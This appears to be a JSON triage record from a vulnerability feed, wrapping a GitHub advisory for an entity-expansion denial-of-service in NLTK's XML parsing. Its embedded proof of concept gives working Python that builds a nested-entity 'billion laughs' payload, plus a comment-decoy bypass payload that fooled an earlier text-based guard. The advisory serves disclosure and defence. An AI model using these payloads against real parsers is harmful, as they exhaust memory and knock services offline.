@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": \"CVE-2026-78681\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-776\", \"name\": \"Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')\"}], \"description\": \"Several XML parsing sites in NLTK still used `xml.etree.ElementTree` directly, which honours `<!ENTITY>` declarations in a document's internal DTD subset. A crafted document a few hundred bytes long can expand to megabytes in memory (each nesting level multiplies by ten), a denial-of-service.\\n\\nAffected call sites (<= 3.10.2):\\n- `nltk.chunk.named_entity.load_ace_file` — parses ACE annotation XML\\n- `nltk.internals.ElementWrapper` — converts any given string to an Element\\n- `nltk.downloader` — `Package.fromxml`, `Collection.fromxml`, `_find_collections`, `_find_packages`\\n\\nlibexpat 2.6.0 added an input-amplification cap, but it only engages above an activation threshold (~8 MiB output) and depends on whichever libexpat the interpreter links; builds against older libexpat have no cap at all. External entities are not resolved by ElementTree, so this is a memory-amplification DoS (CWE-776), not XXE/file disclosure.\\n\\nThis completes the earlier defusedxml adoption that these sites were missed by. Fix routes all of them through a new `nltk.xmlsec` module that refuses entity declarations, preferring `defusedxml` and falling back to a standard-library `xml.parsers.expat` pre-scan when defusedxml is absent.\\n\\n---\\n\\n## Attack demonstration\\n\\nReproducible PoC against a real affected entry point (`nltk.internals.ElementWrapper`). Every number below is captured output, not illustrative.\\n\\n### 1. The amplification (vulnerable path: raw `xml.etree.ElementTree`)\\n\\nA payload of a few hundred bytes expands to megabytes in memory. Each nesting level multiplies output by 10 while adding ~56 bytes of input:\\n\\n| levels | input bytes | expanded bytes | factor |\\n|--------|-------------|----------------|--------|\\n| 3 | 218 | 10,000 | x45 |\\n| 4 | 274 | 100,000 | x364 |\\n| 5 | 330 | 1,000,000 | x3,030 |\\n| 6 | 386 | (libexpat 2.7.1 cap trips) | - |\\n\\nThe level-6 cap is **libexpat's**, not NLTK's: it only engages above an ~8 MiB activation threshold, and older libexpat builds (still shipped with many 3.10/3.11 interpreters) have no cap at all. Under the threshold — up to ~1 MB per parse here — expansion always succeeds.\\n\\n```python\\nimport xml.etree.ElementTree as ET\\ndef bomb(levels):\\n    d = \\\"\\\\n\\\".join(f'<!ENTITY e{i} \\\"{(\\\"&e%d;\\\"%(i-1))*10}\\\">' for i in range(1, levels+1))\\n    return f'<!DOCTYPE d [<!ENTITY e0 \\\"AAAAAAAAAA\\\">{d}]><d>&e{levels};</d>'\\nET.fromstring(bomb(5))   # -> element whose .text is 1,000,000 chars\\n```\\n\\n### 2. The patched entry point rejects it\\n\\n```\\n>>> from nltk.internals import ElementWrapper\\n>>> ElementWrapper(bomb(5))\\nEntitiesForbidden: EntitiesForbidden(name='e0', ...)\\n```\\n\\n### 3. Why a text-based screen is not enough\\n\\nAn entity declaration can hide behind a decoy `<!DOCTYPE>` in a prolog comment. Raw ElementTree still processes the real declaration and expands; a guard that walks the DOCTYPE text is fooled. The shipped guard re-parses with expat, so it is not:\\n\\n```python\\nevil = '<!-- <!DOCTYPE x [ ] > --><!DOCTYPE d [<!ENTITY a \\\"PPPP...\\\">]><d>&a;</d>'\\n```\\n\\n```\\nraw ElementTree -> EXPANDS ('PPPPPPPPPPPP...', 40 chars)\\nnltk.xmlsec     -> REJECTED (EntitiesForbidden)\\n```\\n\\nAn earlier draft of the fallback that walked the text **was** bypassed by this and 4 similar payloads (decoy DOCTYPE in a PI, stray `]` inside a PI in the internal subset). All five are now regression tests.\\n\\n### 4. Both back ends block it\\n\\n`nltk.xmlsec` prefers `defusedxml` and falls back to a stdlib `xml.parsers.expat` pre-scan. Same payloads, defusedxml hidden to force the fallback:\\n\\n```\\nstdlib fallback | billion-laughs               -> REJECTED (EntitiesForbidden)\\nstdlib fallback | comment-decoy differential   -> REJECTED (EntitiesForbidden)\\n```\\n\\nEnvironment: python 3.13.7, libexpat 2.7.1. Confirmed identical amplification on python 3.10 (NLTK's floor).\", \"epss\": {\"percentage\": 0.00294, \"percentile\": 0.21579}, \"ghsa_id\": \"GHSA-97qj-x29f-37w7\", \"github_reviewed_at\": \"2026-09-08T16:42:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-97qj-x29f-37w7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-97qj-x29f-37w7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-78681\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-08T16:42:18Z\", \"references\": [\"https://github.com/nltk/nltk/security/advisories/GHSA-97qj-x29f-37w7\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-78681\", \"https://github.com/nltk/nltk/commit/e91789c9a043296ad04912ce171c22776d45963b\", \"https://github.com/nltk/nltk/releases/tag/v3.10.3\", \"https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3748.yaml\", \"https://www.vulncheck.com/advisories/nltk-before-entity-expansion-dos-via-elementtree\", \"https://github.com/advisories/GHSA-97qj-x29f-37w7\"], \"repository_advisory_url\": \"https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-97qj-x29f-37w7\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nltk/nltk\", \"summary\": \"NLTK: Entity-expansion DoS (billion laughs) via remaining raw ElementTree parses\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-08T16:42:19Z\", \"url\": \"https://api.github.com/advisories/GHSA-97qj-x29f-37w7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.10.3\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"nltk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.10.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-97qj-x29f-37w7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nltk: <= 3.10.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-78681"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nltk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-08T19:13:18.167537Z",
+  "provenance": {
+    "content_sha256": "7b7e02ff7d03b5693e6bf1c2d45654acda5a78d340000c17e7105f3e33e00f10",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-08T16:42:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-97qj-x29f-37w7",
+  "status": "active",
+  "title": "NLTK: Entity-expansion DoS (billion laughs) via remaining raw ElementTree parses",
+  "updated_at": "2026-09-08T16:42:19Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-97qj-x29f-37w7"
+}
